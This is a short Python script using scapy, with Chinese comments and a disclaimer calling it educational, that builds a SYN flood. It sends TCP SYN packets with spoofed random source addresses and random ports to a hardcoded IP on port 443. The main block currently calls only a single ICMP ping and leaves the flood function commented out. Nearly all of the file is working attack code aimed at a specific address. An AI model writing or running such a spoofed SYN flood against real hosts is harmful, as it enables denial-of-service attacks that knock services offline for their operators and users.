#!/usr/bin/env python3
from scapy.layers.inet import *
from scapy.all import *
import random
import time
#from scapy.layers.inet import IP,TCP


# 法律免责声明
print("[!] 本代码仅用于教育目的和研究学习")
print("[!] 未经授权对网络系统进行扫描或攻击是非法的")
print("[!] 使用者需对自身行为承担全部法律责任\n")

# 配置参数
target_ip = "23.106.157.160"  # 修改为目标IP
target_port = 443  # 修改为目标端口
packet_count = 100  # 发送数据包数量
delay = 0.1  # 包之间的延迟（秒）


def generate_random_ip():
    """生成随机有效IP地址"""
    return ".".join(map(str, (
        random.randint(1, 254),  # 避免 0.x.x.x
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(1, 254)  # 避免 x.x.x.0
    )))


def syn_flood():
    print(f"[*] 开始发送SYN数据包到 {target_ip}:{target_port}")

    for i in range(1, packet_count + 1):
        # 构造随机化数据包
        ip_layer = IP(
            src=generate_random_ip(),
            dst=target_ip
        )

        tcp_layer = TCP(
            sport=random.randint(1024, 65535),  # 随机源端口
            dport=target_port,
            flags="S",  # SYN标志
            seq=random.randint(1000, 900000)  # 随机序列号
        )

        # 发送数据包
        send(ip_layer / tcp_layer, verbose=2)

        # 显示进度
        if i % 10 == 0:
            print(f"[+] 已发送 {i}/{packet_count} 个数据包...")

        time.sleep(delay)  # 控制发送速率

    print("[+] 数据包发送完成")


def syn2():
    #pkt = IP(src=generate_random_ip(),dst=target_ip) / TCP(sport=random.randint(1024, 65535),dport=target_port, flags="S", seq=1647242753, )
    # options=[("MSS", 1452), ("WScale", 7), ("Timestamp", (123456789, 987654321))]
    pkt = IP(dst=target_ip) / ICMP()
    send(pkt)

if __name__ == "__main__":
    #syn_flood()
    syn2()
    print(RandInt())